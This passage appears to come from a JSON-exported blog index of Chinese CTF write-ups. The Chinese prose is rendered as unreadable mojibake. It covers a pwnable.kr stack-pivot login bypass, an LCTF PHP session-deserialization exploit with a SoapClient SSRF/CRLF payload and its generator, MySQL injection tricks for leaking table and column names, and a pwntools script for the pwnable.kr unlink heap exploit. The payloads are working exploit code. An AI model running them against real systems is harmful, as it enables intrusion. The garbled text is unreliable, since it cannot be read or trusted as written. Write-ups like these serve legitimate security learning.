é‚£ä¸ªæ–‡ä»¶æˆ‘äº†è§£åˆ°ä¹Ÿä¸æ˜¯å¾ˆé€å½»ï¼Œå¯ä»¥å‚è€ƒï¼šsudoers å€Ÿç”¨é‡Œé¢çš„ä¸€å¼ å›¾å°±å¾ˆæ˜äº†äº†ï¼š ok,å°±è¿™ä¹ˆå¤šï¼Œä¸‹æ¬¡å°½é‡é€‰ä¸ªéš¾ç‚¹çš„ã€‚ã€‚233","path":"2018/12/02/VulnHub JIS-CTF/","date":"12-02","excerpt":""},{"title":"PWNABLE.kr --- simple login","text":"çœŸçš„å¾ˆ simpleï¼Œæˆ‘è¿˜åšäº†å¾ˆä¹…ï¼Œã€‚ã€‚ã€‚ æ­¤é¢˜æ¥è‡ª ï¼š pwnable.kr ä»£ç ï¼š å¾ˆç®€å•çš„ä»£ç ï¼Œæ¥æ”¶ä¸€ä¸ªé•¿åº¦ 30 ä¹‹å†…çš„å­—ç¬¦ä¸²è¿›è¡Œ base64decode ï¼Œå†åˆ¤æ–­é•¿åº¦æ˜¯å¦å¤§äº 0xCï¼Œç„¶åè¿›å…¥ auth å‡½æ•°ã€‚ è¿™é‡Œå¯ä»¥æ³¨æ„ä¸€ä¸‹ç¬¬ 21 è¡Œï¼Œå°†è¾“å…¥çš„å­—ç¬¦ä¸² base64è§£ç åçš„å­—ç¬¦ä¸²ï¼ˆv4ï¼‰å¤åˆ¶åˆ°å…¨å±€å˜é‡ input ä¸­ã€‚ çœ‹çœ‹ auth å‡½æ•°ï¼š ä¹Ÿå¾ˆç®€å•ï¼ŒæŠŠ input å–å‡ºæ¥ï¼Œmd5ï¼Œç„¶åè¾“å‡º md5ï¼Œç„¶åå’Œ f87cd... æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ã€‚ æœ€åå›åˆ° main å‡½æ•°ç¬¬ 22 è¡Œï¼Œå¦‚æœç›¸ç­‰é‚£ä¹ˆå°±è¿›å…¥ correct å‡½æ•°ã€‚ è¿™é‡Œåˆ¤æ–­äº† input æ˜¯å¦ä¸º -559038737ï¼Œéš¾é“è®©æˆ‘ä»¬è¾“å…¥çš„æ˜¯è¿™ä¸ªå—ï¼Ÿ æ€ä¹ˆå¯èƒ½ã€‚ã€‚ã€‚æŠŠè¿™ä¸ªæ•°å­—å» md5 åŠ å¯†ä¸€ä¸‹å°±çŸ¥é“ä¸å¯¹äº†ã€‚ è¿‡ç¨‹ä¸€å¼€å§‹æ²¡ä»”ç»†çœ‹ correct å‡½æ•°ï¼Œä»¥ä¸ºè¿›å…¥å°±ç›´æ¥è·å¾— shell äº†ï¼Œæ‰€ä»¥åœ¨çº ç»“èƒ½å¦ç›´æ¥é€šè¿‡ authï¼Œä¸ºæ­¤æˆ‘è¿˜å»å°è¯•è§£å¯† f87cd601aa7fedca99018a8be88eda34 è¿™ä¸ªã€‚ã€‚æ— æœã€‚ã€‚ã€‚ é‚£ä¹ˆæˆ‘å°±åœ¨æƒ³ä¼šä¸ä¼šæ˜¯å“ªé‡Œæº¢å‡ºäº†å‘¢ã€‚ã€‚ä½†æ˜¯ main å‡½æ•°é‡Œå­—ç¬¦é™åˆ¶çš„éƒ½å¾ˆå¥½ï¼Œäºæ˜¯æˆ‘å†ä¸€æ¬¡è¿›å…¥äº† auth å‡½æ•°ã€‚ ç„¶åå¾ˆç†æ‰€å½“ç„¶çš„æ³¨æ„åˆ°ï¼š v4 é•¿åº¦æ˜¯ 8 ï¼Œä½†æ˜¯ å‰é¢æåˆ°è¿‡ input çš„é•¿åº¦æ˜¯ 0xCï¼Œå³ 12ï¼Œæ‰€ä»¥åˆšå¥½å¯ä»¥è¦†ç›–åˆ°ä¸Šä¸€å±‚çš„ ebp å€¼ bingoï¼Œäºæ˜¯æˆ‘ä»¬æƒ³åˆ°äº†ï¼š 123456781. åœ¨ `auth` å‡½æ•°è¦†ç›–ä¸Šå±‚å‡½æ•° `ebp`ï¼Œå‡è®¾ä¸º `fake_ebp`2. `auth` é€€å‡ºå `ebp` ä¸º `fake_ebp`3. å›åˆ° `main` å‡½æ•°ä¹Ÿä¸ä¼šæ‰§è¡Œä»€ä¹ˆä»£ç å°±é€€å‡ºäº†ï¼Œæ­¤æ—¶æ‰§è¡Œï¼š `leave` `ret`è¿™ä¸¤è¡Œä»£ç å¾ˆç†Ÿæ‚‰äº†ï¼Œè¯´ç™½äº†å°±æ˜¯ï¼š`leave = mov esp,ebp;pop ebp;``ret = pop eip` ä½†æ˜¯ä¸è¦å¿˜äº†ï¼Œåœ¨ auth å‡½æ•°é€€å‡ºæ—¶ä¹Ÿæ‰§è¡Œäº† leave ; retã€‚ æ‰€ä»¥æ˜¯æ‰§è¡Œäº†ä¸¤æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦æ‰¾ä¸€ä¸ªå¯ä»¥æ§åˆ¶çš„åœ°æ–¹ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°æ–¹å¾ˆæ˜¾ç„¶åªæœ‰ä¸€ä¸ª input äº†ã€‚äºæ˜¯ï¼š1paylaod = &apos;a&apos;*4 + getshell_addr + input_addr è¿™é‡Œçš„ getshell_addr æ˜¯ correct å‡½æ•°é‡Œ system(&#39;/bin/sh&#39;) é‚£ä¸€è¡Œã€‚ è¿™æ ·åœ¨ç¬¬ä¸€æ¬¡æ‰§è¡Œå®Œ leave ; ret å ebp å°±æŒ‡å‘äº† input çš„åœ°å€ï¼ˆâ€™aaaaâ€™ çš„åœ°æ–¹ï¼‰ï¼Œç„¶åç¬¬äºŒæ¬¡æ‰§è¡Œçš„æ—¶å€™ï¼š12leave = mov esp,ebp(aaaa çš„ä½ç½®) ; pop ebp (æ­¤å¤„å¯ä»¥æ— è§† `ebp`ï¼Œä½†æ˜¯ `esp+4` äº†ï¼Œæ‰€ä»¥ `esp` æŒ‡å‘äº† `getshell_addr` çš„ä½ç½® )ret = mov eip,espï¼ˆæ­¤æ—¶æŒ‡å‘äº† `getshell_addr` çš„ä½ç½®äº†ã€‚ï¼‰ okï¼Œåˆ°è¿™é‡Œåˆ†æå®Œäº†ã€‚ã€‚ã€‚ ç„¶è€Œæˆ‘ç¬¬ä¸€æ¬¡çš„ payload å°½ç„¶æ˜¯ï¼š&#39;a&#39;*8 + getshell_addr-4 è¿˜ä¹…ä¹…çš„æ²¡ååº”è¿‡æ¥ï¼Œè°ƒè¯•äº†æ‰å‘ç°çš„ã€‚å“ï¼Œæ‰“æ‰°äº†ã€‚ã€‚","path":"2018/11/27/PWNABLE.kr --- simple login/","date":"11-27","excerpt":""},{"title":"LCTF bestphps_revenge å¤ç°æ€»ç»“","text":"å½©ç¬”åªèƒ½å¤ç° :( çŸ¥è¯†ç‚¹ é¦–å…ˆçœ‹çœ‹ php ä¸­ SESSION é»˜è®¤æ˜¯æ€ä¹ˆå­˜å‚¨çš„ï¼š12345&lt;?phpsession_start();$_SESSION[&apos;a&apos;]=&apos;1&apos;;$_SESSION[&apos;b&apos;]=&apos;1&apos;;?&gt; æ‰“å¼€ session æ–‡ä»¶ï¼š a|s:1:â€1â€;b|s:1:â€1â€; ä½†æ˜¯ php è¿˜æœ‰å¦ä¸€ç§å­˜å‚¨æ–¹å¼ï¼ˆä¸è·Ÿä½ è¯´ä½ è¿˜ä¸çŸ¥é“å§~ï¼‰ï¼šhttp://php.net/manual/zh/session.configuration.php#ini.session.serialize-handler å¦ä¸€ç§å­˜å‚¨æ–¹å¼å«ï¼šphp_serializeï¼Œé»˜è®¤çš„å«ä»€ä¹ˆï¼Ÿå«ï¼šphp è®¾ç½®æœ‰ä¸‰ç§æ–¹æ³•ï¼š1231. åœ¨ php.ini ä¸­ä¿®æ”¹è¿™ä¸€è¡Œï¼š session.serialize_handler = php2. ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);3. session_start(array(&quot;serialize_handler&quot;=&gt;&quot;php_serialize&quot;)); ç¬¬ä¸‰ç§æ–¹æ³•æ˜¯ php7 åŠ ä¸Šçš„ï¼š æ³¨æ„æ˜¯ 7 æ‰åŠ ä¸Šçš„ï¼ï¼ï¼å…¶ä»–çš„ seesion å‚æ•°åº”è¯¥ä¹Ÿèƒ½æ”¹ã€‚ å¥½äº†å¥½äº†ï¼Œæ¥çœ‹çœ‹ php_serialize æ˜¯æ€ä¹ˆå­˜å‚¨ SESSION æ•°æ®çš„ï¼š 12345&lt;?phpsession_start(array(&quot;serialize_handler&quot;=&gt;&quot;php_serialize&quot;));$_SESSION[&apos;a&apos;]=&apos;1&apos;;$_SESSION[&apos;b&apos;]=&apos;1&apos;;?&gt; a:2:{s:1:â€aâ€;s:1:â€1â€;s:1:â€bâ€;s:1:â€1â€;} æ²¡é”™ï¼Œç”¨è¿‡ serialize å‡½æ•°çš„éƒ½çœ‹å¾—å‡ºæ¥è¿™ç›´æ¥ç”¨äº†è¿™ä¸ªå‡½æ•°åºåˆ—åŒ–çš„ï¼ˆåˆšåˆšç»™çš„æ–‡æ¡£é‡Œä¹Ÿæœ‰è¯´ã€‚ã€‚ã€‚ï¼‰ æ¥ä¸‹æ¥å†è¯¦ç»†ç‚¹ï¼Œæˆ‘ä»¬çœ‹çœ‹ php æ¨¡å¼æ˜¯æ€ä¹ˆå­˜å‚¨å¯¹è±¡çš„ï¼š1234567891011&lt;?phpclass Test&#123; public $test_variable = &quot;niubi&quot;; public function __destruct()&#123; echo $this-&gt;test_variable; &#125;&#125;session_start();$_SESSION[&apos;a&apos;]=&apos;1&apos;;$_SESSION[&apos;b&apos;]=new Test();?&gt; a|s:1:â€1â€;b|O:4:â€Testâ€:1:{s:13:â€test_variableâ€;s:5:â€niubiâ€;} php_serialize å‘¢ï¼Ÿ a:2:{s:1:â€aâ€;s:1:â€1â€;s:1:â€bâ€;O:4:â€Testâ€:1:{s:13:â€test_variableâ€;s:5:â€niubiâ€;}} å¯ä»¥å‘ç°è¿™é‡Œä¹Ÿæœ‰å…±åŒç‚¹ï¼šO:4:&quot;Test&quot;:1:{s:13:&quot;test_variable&quot;;s:5:&quot;niubi&quot;;}ï¼ˆä¸ä¿¡å°±æŒ‰ ctrl+f çœ‹çœ‹ï¼‰ æ¥ä¸€ä¸ªæœ‰æ„æ€çš„ä¾‹å­ï¼šï¼ˆæ­¤å¤„å»ºè®®å…ˆæ¸…ç©º SESSION æˆ–è€…å¹²è„†ç›´æ¥åˆ æ‰ SESSION æ–‡ä»¶ä¹Ÿå¯ä»¥ï¼‰ 1234567891011//a.php&lt;?phpclass Test&#123; public $test_variable = &quot;niubi&quot;; public function __destruct()&#123; echo $this-&gt;test_variable; &#125;&#125;session_start(array(&quot;serialize_handler&quot;=&gt;&quot;php_serialize&quot;));$_SESSION[&apos;a&apos;]=&apos;a|s:1:&quot;b&quot;;c|O:4:&quot;Test&quot;:1:&#123;s:13:&quot;test_variable&quot;;s:5:&quot;niubi&quot;;&#125;&apos;;?&gt; 1234567891011//b.php&lt;?phpclass Test&#123; public $test_variable = &quot;niubi&quot;; public function __destruct()&#123; echo $this-&gt;test_variable; &#125;&#125;session_start();var_dump($_SESSION);?&gt; æ˜¯çš„ï¼Œè¿™ä¸¤ä¸ª php æ–‡ä»¶ç”¨äº†ä¸åŒçš„åºåˆ—åŒ–æ–¹å¼ã€‚å…ˆè®¿é—® a.php ï¼Œæ­¤æ—¶ SESSION æ–‡ä»¶åº”è¯¥æ˜¯ï¼š a:1:{s:1:â€aâ€;s:60:â€a|O:4:â€Testâ€:1:{s:13:â€test_variableâ€;s:5:â€niubiâ€;} åˆ†æä¸€ä¸‹æ­¤æ—¶è®¿é—® b.php ä¼šæ€ä¹ˆè§£æå‘¢ï¼š c ä¸º ç¬¬ä¸ªé”®ï¼ŒTest å¯¹è±¡ä¸ºå€¼ã€‚ï¼ˆè¿™é‡Œå…¶å®è¿˜ä¼šæ‰§è¡Œ test å¯¹è±¡çš„ __destruct å‡½æ•°ï¼‰ è®¿é—®ä¸€ä¸‹ b.phpï¼š bingo~ å›åˆ°æ­£é¢˜ã€‚ã€‚ã€‚ã€‚æ²¡é”™ï¼Œæ­£é¢˜æ˜¯é¢˜ç›®ï¼Œåˆ«å¿˜äº†è¿™æ˜¯ä¸ªé¢˜ç›®åˆ†æçš„æ–‡ç« ã€‚ã€‚ã€‚ é¢˜ç›®ä»£ç ï¼š12345678910111213&lt;?php//index.phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name]))&#123; $_SESSION[name] = $_GET[name];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a);?&gt; 12345678910111213141516&lt;?php//flag.php&lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;$_GET[&apos;f&apos;]=&quot;session_start&quot;;$_POST[&apos;serialize_handler&apos;]=&apos;php_serialize&apos;;call_user_func($_GET[&apos;f&apos;],$_POST);session_start();if(isset($_GET[&apos;name&apos;]))&#123; $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a);?&gt; æ²¡é”™ï¼Œè¿™æ˜¯åˆ° SSRFï¼Œæ€ä¹ˆ SSRF æš‚ä¸”ä¸æã€‚ å…ˆæƒ³æƒ³æ€ä¹ˆåˆ©ç”¨ï¼š ä» flag.php å¯ä»¥çœ‹å‡ºæŠŠ flag æ”¾åˆ° SESSION é‡Œäº†ã€‚ PHP é‡Œæœ‰ä¸ªå†…ç½®ç±»å¯ä»¥è®¿é—® Webã€‚ æˆ‘å‰é¢éƒ½é“ºå«äº†è¿™ä¹ˆé•¿äº†ï¼Œæ‰€ä»¥è¿™ä¹ˆç©ï¼š é€šè¿‡ session å¤„ç†çš„å·®å¼‚ååºåˆ—åŒ– æŸä¸ªç±» è®¿é—® flag.php ã€‚ åˆ©ç”¨é‚£ä¹ˆæŸä¸ªç±»æ˜¯å“ªä¸ªç±»ï¼šSOAP SOAP æ˜¯ä»€ä¹ˆã€‚ã€‚æ€ä¹ˆæ“ä½œæˆ‘å°±ä¸è¯¦ç»†è§£é‡Šäº†ï¼ˆæˆ‘ä¹Ÿä¸ä¼šï¼‰ é£˜é›¶å¸ˆå‚…ä¼šï¼š https://www.anquanke.com/post/id/153065#h2-5 è¿™é‡Œç»™å‡ºåˆ©ç”¨ä»£ç ï¼š12345678910&lt;?php$target = &quot;http://127.0.0.1/flag.php&quot;;$attack = new SoapClient(null,array( &apos;location&apos; =&gt; $target, &apos;user_agent&apos;=&gt;&quot;niuniu^^Cookie: PHPSESSID=s5ndonmikgkcif6q28k0aptnf0^^Content-Type: text/html;charset=UTF-8^^^^&quot;, &apos;uri&apos; =&gt; &quot;/&quot;));$attack = str_replace(&apos;^^&apos;,&quot;\\n\\r&quot;,serialize($attack));$payload = urlencode($attack);echo $payload; è¿™é‡Œæ³¨æ„ str_replace ä¸­ä½¿ç”¨çš„æ˜¯ \\n\\r è€Œä¸æ˜¯ \\r\\nè¾“å‡ºå‡ºæ¥çš„ä¾¿æ˜¯ payloadã€‚ 1. å¼€å¯ php_serialize æ¨¡å¼å›é¡¾ä¸€ä¸‹é¢˜ç›®çš„ä»£ç æ³¨æ„è¿™ä¸€è¡Œï¼š1call_user_func($_GET[f],$_POST); æˆ‘ä»¬å°† f è®¾ç½®ä¸º session_start.$_POST æ˜¯ä¸ªå¤©ç„¶çš„æ•°ç»„ï¼Œæ‰€ä»¥ POST æ•°æ®ä¸ºï¼š1serialize_handler=php_serialize å¯ä»¥åœ¨ä»£ç çš„æœ€å‰é¢æ·»åŠ ä¸Šï¼š12$_GET[&apos;f&apos;]=&quot;session_start&quot;;$_POST[&apos;serialize_handler&apos;]=&apos;php_serialize&apos;; è¿™æ ·å°±ç›¸å½“äº GET å’Œ POST ä¼ å€¼äº† ï¼ˆæˆ‘æ²¡æœ‰ hackbar ï¼Œä¸æƒ³ POST ä¼ å•Šï¼‰ 2.å†çœ‹çœ‹è¿™ä¸‰è¡Œï¼š 123if(isset($_GET[&apos;name&apos;]))&#123; $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];&#125; è¿™ä¸å°±æ˜¯ç›´æ¥å¸®æˆ‘ä»¬å†™è¿› SESSION æ–‡ä»¶å—ï¼Ÿæµ‹è¯•ä¸­å‘ç° $_GET[â€˜nameâ€™] ä¸èƒ½å†™åœ¨ä»£ç ä¸­ï¼Œæ‰€ä»¥è¿˜æ˜¯è€è€å®å®çš„å†™åœ¨ url é‡Œå§ï¼ˆåœ¨æµ‹è¯•ä¸­é‡åˆ°äº†ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ã€‚ã€‚ã€‚ï¼‰ æ‰€ä»¥æœ€åå‚æ•°åˆ†åˆ«æ˜¯ï¼š 123$_GET[&apos;f&apos;] = &apos;session_start&apos;;$_POST[&apos;serialize_handler&apos;]=&apos;php_serialize&apos;;$_GET[&apos;name&apos;] = &apos;|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A1%3A%22%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A95%3A%22niuniu%0A%0DCookie%3A+PHPSESSID%3Ds5ndonmikgkcif6q28k0aptnf0%0A%0DContent-Type%3A+text%2Fhtml%3Bcharset%3DUTF-8%0A%0D%0A%0D%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&apos;; // name ç”¨ `url` ä¼ é€’ æˆ‘ä»¬å¯ä»¥æ–°å¼€ä¸ªæ–‡ä»¶å¹¶è®¿é—®ï¼š1234&lt;?phpsession_start();var_dump($_SESSION);?&gt; ä¼šå‘ç°å·²ç»æœ‰æˆ‘ä»¬çš„ SOAP å¯¹è±¡äº†ã€‚ æ¥ä¸‹æ¥ä½¿ç”¨å†è°ƒç”¨ä¸€ä¸‹å¯¹è±¡å°±å¯ä»¥äº†ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨çš„å‚æ•°å°±æ˜¯ï¼š 12$_GET[&apos;f&apos;] = &apos;extract&apos;;$_POST[&apos;b&apos;]=&apos;call_user_func&apos;; å°±å¯ä»¥äº†ã€‚ f çš„ç›®çš„åœ¨äº å°† b è¦†ç›–æˆ call_user_funcï¼Œåœ¨æœ€åçš„ï¼š call_user_func($b,$a); å°±ä¼šæ‰§è¡Œ SOAP äº†ã€‚ ##ç»“è¯­ å†™åˆ°æœ€åå¿ƒæ€å´©äº†ã€‚ã€‚å‰é¢åˆ†æ php åºåˆ—åŒ–è¿˜æ¯”è¾ƒæ»¡æ„ï¼Œå†™åˆ° CTF é¢˜æ—¶é‡åˆ°äº†å¾ˆå¤šé—®é¢˜ä¹Ÿæ²¡å†™å¥½ã€‚ã€‚ã€‚æ‰€ä»¥è¿˜ä¸å¦‚ç›´æ¥çœ‹å‚è€ƒä¸­çš„ WPã€‚ å‚è€ƒï¼š https://xz.aliyun.com/t/3336#toc-3ï¼ˆè¿™é¢˜çš„ WPï¼‰https://github.com/CTFTraining/lctf_2018_bestphp_s_revenge/tree/master/files/srcï¼ˆè¿™é‡Œæœ‰æºç ï¼‰","path":"2018/11/27/LCTF bestphps_revenge å¤ç°æ€»ç»“/","date":"11-27","excerpt":""},{"title":"sql æ³¨å…¥çš„ä¸€äº›å°å§¿åŠ¿","text":"åˆ©ç”¨å·²çŸ¥åˆ—åçˆ† åº“å å’Œ è¡¨å å¯ä»¥å‘ç°å¿…é¡»è¦åˆ—åæ­£ç¡®ï¼Œç±»ä¼¼çš„ä¸€å…±æœ‰ï¼špolygonã€multipointã€multilinestringã€multipolygonã€linestring ç”¨å·²çŸ¥åº“åçˆ†åˆ—å åŸç†å˜›ã€‚ã€‚ã€‚ä¸æ˜¯å¾ˆæ¸…æ¥š è¯­å¥ï¼šand (select * from (select * from mysql.user a join mysql.user b using(Host,User))c); ç»•è¿‡åˆ—åçˆ†æ•°æ® select table_schema,table_name from information_schema.tables where table_name=&#39;session&#39; union select 1,(select h.2 from (select 1,2 union select user,host from mysql.user limit 1 offset 3 )h); è¿™é‡Œçš„å…³é”®åº”è¯¥åœ¨ï¼š select h.2 from (select 1,2 union select user,host from mysql.user limit 1 offset 3 )h å¯ä»¥å‘å…ˆåˆ—åå˜æˆäº†æˆ‘ä»¬æ„é€ çš„ï¼Œåº”è¯¥æ˜¯å› ä¸º union ä¼šä½¿ç”¨ ç¬¬ä¸€ä¸ª select çš„è¯­å¥ä½œä¸ºåˆ—åã€‚","path":"2018/11/11/sql æ³¨å…¥çš„ä¸€äº›å°å§¿åŠ¿/","date":"11-11","excerpt":""},{"title":"å †æº¢å‡º2 -- ä» ruozhi çš„è§’åº¦çœ‹ pwnable.kr çš„ unlink","text":"æ¥è‡ª pwnable.kr çš„ä¸€é“ç‰¹åˆ«çš„ unlink é¢˜è¿™é¢˜çš„ç¨‹åº é¦–å…ˆå…ˆçœ‹çœ‹ä»£ç å§ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123; struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];&#125;OBJ;void shell()&#123; system(&quot;/bin/sh&quot;);&#125;void unlink(OBJ* P)&#123; OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;&#125;int main(int argc, char* argv[])&#123; malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf(&quot;here is stack address leak: %p\\n&quot;, &amp;A); printf(&quot;here is heap address leak: %p\\n&quot;, A); printf(&quot;now that you have leaks, get shell!\\n&quot;); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;&#125; åˆ†æç¨‹åºä¸æ˜¯å¾ˆé•¿ï¼Œå¾ˆå®¹æ˜“æ‡‚ï¼š è‡ªå®šäº†ä¸ªç±»ä¼¼ chunk çš„ç»“æ„ è‡ªå®šäº†ä¸ª unlink å‡½æ•°ï¼ˆåŸ unlink å‡½æ•°å·²ç»æœ‰ä¿æŠ¤äº†ï¼Œæ‰€ä»¥åˆ©ç”¨ä¸èµ·æ¥ã€‚ï¼‰ ç”³è¯·äº†ä¸‰ä¸ª chunk gets å‡½æ•°è¿™é‡Œå¯ä»¥å†™ä»»æ„é•¿åº¦çš„æ•°æ®ï¼Œå¯ä»¥è¦†ç›– B çš„ chunk ç¨‹åºè¿˜æœ‰ä¸ª shell å‡½æ•°ï¼Œå°† eip æŒ‡å‘æ­¤å¤„å³å¯ï¼Œä¸éœ€è¦å†™ shell äº†ã€‚ è¿™é‡Œæ³„éœ²äº† heap å’Œ stack çš„åœ°å€ åˆ©ç”¨ç°åœ¨æœ€å¤§çš„é—®é¢˜å°±æ˜¯ï¼Œå°† shell çš„åœ°å€å†™åˆ°å“ªé‡Œå¯ä»¥æ§åˆ¶ eip ï¼Ÿ ï¼ˆæ­¤æ—¶æ— è€»çš„ç¿»ä¸€ä¸‹ WPï¼‰ ç¨‹åºåˆ†ææŸ¥çœ‹è¯¥ç¨‹åºçš„æ±‡ç¼–ä»£ç ï¼š objdump -M intel -S unlinkç¿»åˆ° main å‡½æ•°çš„æœ€åï¼Œå¯ä»¥æ³¨æ„åˆ°å‡ å¥æœ‰æ„æ€çš„ä»£ç ï¼š 123480485ff: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4]8048602: c9 leave 8048603: 8d 61 fc lea esp,[ecx-0x4]8048606: c3 ret ebp çš„åœ°å€ï¼Ÿ åœ¨è¿™é‡ŒæŠŠ [ecx-0x4] çš„å€¼ç»™äº† espï¼Œç„¶åè°ƒç”¨äº† retï¼Œæ‰€ä»¥æ­¤å¤„åªè¦èƒ½æ§åˆ¶ ecx-0x4 ä¸‹çš„å€¼ï¼Œå°±å¯ä»¥æ§åˆ¶ eip ecx åˆæ¥è‡ª ebp-0x4ï¼Œä½†æ˜¯ç¨‹åºå·²ç»æ³„éœ²äº† å˜é‡A çš„åœ°å€äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ A çš„åœ°å€åç§»æŸä¸ªå€¼å¾—åˆ° EBPï¼Œè¿™ä¸ªä¸æ˜¯é‡ç‚¹ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå…ˆè¯´åç§»é‡ï¼šEBP = A + 0x14ã€‚ å°† shellcode åœ°å€å†™åœ¨å“ªé‡Œï¼Ÿ å°†ä¸Šé¢çš„ä»£ç è§£æä¸€ä¸‹ï¼š *(*(ebp-4)-4) = shellcodeåœ°å€ã€‚ æ‰€ä»¥åœ°å€ *(ebp-4)-4 ä¸‹çš„å†…å®¹æˆ‘ä»¬ä¹Ÿè¦æ§åˆ¶ã€‚æ­£å¥½æˆ‘ä»¬è¿˜æœ‰ä¸€å—åœ°å€ï¼š å˜é‡A ã€‚ ç›´æ¥çœ‹ payload å§ï¼š shellcode_addr(1) + å¡«å……(2) + ï¼ˆ å˜é‡A + 8 +4ï¼‰ï¼ˆ3ï¼‰ + EBP-0x4ï¼ˆ4ï¼‰ shellcode_addr å¯ä»¥é€šè¿‡ç¨‹åºè·å–åˆ°ï¼š 0x80484eb å¡«å……æ˜¯ ï¼ˆ16-4ï¼‰ ä¸ªï¼Œï¼ˆå…¶å®æˆ‘è§‰å¾— buf åº”è¯¥æ˜¯ 8 ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯ä»è°ƒè¯•çœ‹æ¥ buf å¥½åƒæœ‰ 16 ä¸ªå­—èŠ‚ä¸€æ ·ï¼Œå¯èƒ½æ˜¯å¯¹é½ï¼Ÿï¼‰ å˜é‡A çš„åœ°å€æŒ‡å‘çš„æ˜¯ fdï¼Œä½†æ˜¯ shellcode_addr åœ¨ buf å¤„ï¼Œæ‰€ä»¥è¦åŠ ä¸Š 8ï¼Œåˆå› ä¸ºè¿˜è¦è¿‡ä¼šè¿˜è¦ -4 ï¼Œæ‰€ä»¥å†åŠ ä¸Š 4 ã€‚ *(ebp-4) å¤„å–çš„æ˜¯ ebp-4 çš„ä½ç½®ï¼Œæ•… -4ã€‚ okï¼Œpayload æ„é€ å®Œäº†ï¼Œåˆ©ç”¨èµ·æ¥å°±å¯ä»¥äº†ã€‚ å†è¯´è¯´æ€ä¹ˆå¾—åˆ°çš„ A ç›¸å¯¹ EBP çš„åç§»é‡ï¼Œæˆ‘ä»¬å¹»æƒ³ä¸€ä¸‹æ ˆï¼š 12345A &lt;=== æ³„éœ²åœ°å€B -0x4C -0x8EBP -0xCEIP -0x10 è¿™ä¹ˆè®¡ç®—èµ·æ¥ EBP åº”è¯¥ä½äº A-0xC å¤„ï¼Œä½†æ˜¯å®é™…ä¸Šå´æ˜¯ 0x14 é™¤ï¼Œä¸­é—´å¤šå‡ºæ¥çš„ 8 ä¸ªå­—èŠ‚æˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯å•¥ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ gdb è°ƒè¯•çš„æ–¹å¼å¾—åˆ°è¿™ä¸ªåç§»ï¼ˆå½“ç„¶æˆ‘ä¸€å¼€å§‹ä¹Ÿæ˜¯çœ‹çš„ WPï¼‰ã€‚ è´´ä¸€ä¸‹ä»£ç ï¼š12345678910111213141516171819202122232425from pwn import *p = process(&apos;./unlink&apos;)p.recvuntil(&apos;stack address leak: &apos;)stack_addr = p.recvuntil(&apos;\\n&apos;)p.recvuntil(&apos;heap address leak: &apos;)heap_addr = p.recvuntil(&apos;\\n&apos;)stack_addr = int(stack_addr,16)heap_addr = int(heap_addr,16)shell_addr = 0x80484ebebp = stack_addr + 0x14print &quot;stack : &quot;+ str(hex(stack_addr))print &quot;heap : &quot;+ str(hex(heap_addr))payload = p32(shell_addr) + &apos;a&apos;*12 + p32(heap_addr + 12) + p32(ebp-4)#gdb.attach(p)#pause()p.recvuntil(&apos;shell!&apos;)p.sendline(payload)p.interactive()","path":"2018/10/28/ä»ruozhi çš„è§’åº¦çœ‹ pwnable çš„ unlink/","date":"10-28","excerpt":""},{"title":"å †æº¢å‡º1 -- unlink","text":"åŸæ–‡ ç…§ç€è¿™ç¯‡æ–‡ç« å†™çš„ï¼Œä¸ç®—ç¿»è¯‘å§ï¼ˆæ¯•ç«Ÿæˆ‘è‹±æ–‡å·®çš„**ï¼‰ è¿™ç¯‡æ–‡ç« å°†å­¦ä¹ æ€ä¹ˆä½¿ç”¨ unlink æ¥è¿›è¡Œå †æº¢å‡ºï¼Œå…ˆçœ‹çœ‹æ¼æ´ç¨‹åºï¼š123456789101112131415161718/* Heap overflow vulnerable program. */#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main( int argc, char * argv[] )&#123; char * first, * second;/*[1]*/ first = malloc( 666 );/*[2]*/ second = malloc( 12 ); if(argc!=1)/*[3]*/ strcpy( first, argv[1] );/*[4]*/ free( first );/*[5]*/ free( second );/*[6]*/ return( 0 );&#125; å…ˆçœ‹çœ‹ç¨‹åºçš„ [3] ä¸­åšäº†ä»€ä¹ˆï¼š å°† argv[1] å¤åˆ¶è¿›å †å— first ä¸­ ä¸”æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œå› 